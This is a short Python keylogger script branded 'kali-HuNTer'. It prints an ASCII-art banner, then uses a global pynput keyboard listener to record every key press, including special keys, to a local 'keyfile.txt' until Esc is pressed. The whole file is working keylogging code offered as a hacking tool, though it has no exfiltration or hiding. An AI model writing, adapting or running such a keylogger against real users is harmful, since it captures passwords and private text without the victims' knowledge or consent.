import pyfiglet
from termcolor import colored
from pynput import keyboard

# Function to print ASCII art in blue
def print_ascii_art():
    # Define the text and the font
    text = "kali-HuNTer"
    font = "speed"

    # Generate ASCII art text
    ascii_art = pyfiglet.figlet_format(text, font=font)

    # Print the ASCII art text in blue color
    print(colored(ascii_art, 'blue'))
    print("Author : Vivek Kumar")

# Function to log key presses
def keypressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except AttributeError:
            if key == keyboard.Key.space:
                logKey.write(' ')
            elif key == keyboard.Key.enter:
                logKey.write('\n')
            elif key == keyboard.Key.esc:
                # Stop listener
                return False
            else:
                logKey.write(f'[{key}]')

# Main function
if __name__ == "__main__":
    print_ascii_art()

    # Set up the key listener
    with keyboard.Listener(on_press=keypressed) as listener:
        listener.join()  # This keeps the listener running until you stop it explicitly
